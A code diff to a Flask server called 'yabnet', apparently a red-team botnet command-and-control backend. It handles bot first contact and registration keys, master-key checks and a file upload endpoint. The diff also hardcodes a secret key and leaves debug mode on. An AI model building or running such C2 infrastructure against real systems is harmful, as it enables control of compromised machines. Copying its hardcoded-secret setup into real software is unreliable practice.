@@ -1,4 +1,6 @@
 import os 
+import random
+import string
 
 from flask import Flask, url_for, request, redirect, jsonify, render_template, session, send_from_directory 
 from flask_sqlalchemy import SQLAlchemy
@@ -17,17 +19,17 @@ Also takes are of master console's request/response.
 """
 
 # TODO: Put configuration into a separate init.py file? 
-# TODO: Implement real time bot checking --> right now, we are manually checking by master visitng /bot/list endpoint.
+# TODO: Need upload feature for master to upload a file into the docker container 
 # ========================== Initial Configuration =====================
 
 app = Flask(__name__)
 app.config['DEBUG'] = True
 app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///yabnet.sqlite3'
-app.config['UPLOAD_FOLDER'] = '/opt/yabnet/uploads'
+app.config['UPLOAD_FOLDER'] = './uploads'
 db.app = app
 db.init_app(app)
 
-UPLOAD_DIRECTORY="/opt/yabnet/uploads"
+UPLOAD_DIRECTORY="./uploads"
 if not os.path.exists(UPLOAD_DIRECTORY):
     os.makedirs(UPLOAD_DIRECTORY)
 
@@ -41,9 +43,10 @@ MASTERPASSWORD = os.environ['PASS']
 # TODO: Change the register key to change dynamically 
 # Keys - Hardcoded for now, going to make them random
 # Or implement environment variables here, and then use a configuration file
-FIRSTCONTACTKEY = 'firstcontactkey'
-REGISTERKEY = 'registerkey'
-MASTERKEY = 'masterkey'
+FIRSTCONTACTKEY = 'dudeOurRedteamalreadyhaslike30C2already-Friend'
+REGISTERKEY = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(16))
+MASTERKEY = os.environ['MASTERKEY']
+#MASTERKEY = 'masterkey'
 
 
 # TODO: Create a separate api.py and then import into the init.py file? 
@@ -162,7 +165,7 @@ def firstcontact():
 
     # API Endpoint logic 
     if firstcontact == FIRSTCONTACTKEY:
-        return jsonify({'result': 'success', 'registerkey': 'registerkey'})
+        return jsonify({'result': 'success', 'registerkey': REGISTERKEY})
     else:
         return jsonify({'result': 'fail', 'error': 'wrong firstcontactkey'})
 
@@ -480,12 +483,17 @@ def list_files():
     
     return jsonify(files)
 
-@app.route('/upload')
+@app.route('/upload', methods=['POST'])
 def upload_file():
     """
     Description: File upload endpoint for the bot. 
     TODO: Change this into POST request method and only allow upload from registered bots  
     """
+    # Error checking 
+    error = posterrorcheck(request, 'masterkey')
+    if error is not True:
+        return error 
+
     uploaded_file = request.files['file']
 
     try:
